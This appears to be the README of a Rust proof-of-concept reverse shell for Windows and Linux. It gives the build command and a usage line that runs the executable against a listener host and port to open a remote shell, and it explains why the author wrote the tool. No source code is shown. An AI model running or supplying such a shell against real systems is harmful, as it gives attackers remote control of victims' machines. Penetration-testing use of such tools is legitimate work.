# Reverse shell
A basic proof of concept reverse shell for Windows and Linux in Rust.

## Usage

Compile the code with
```
cargo build --release
```
The executable will be in `target/release`. Just run it with your listener host and port as arguments.
```
./reverse-shell.exe [host] [port]
```

## Why

After some advanced research, I still didn't find a working reverse shell for Windows online in Rust. I found a very simple one for Linux, but it uses files descriptors, so it is completely unusable on Windows... and my primary goal was the Windows support. The only available repository that contains a reverse shell in Rust that is supposed to work for Windows does not compile (and after taking a look at the errors, I wonder how it could have compiled one day). So, I did my best to make one myself, but I found myself struggling **a lot** with Rust's sockets and subprocess interactions. This reverse shell is far from perfect, but at least **it works**.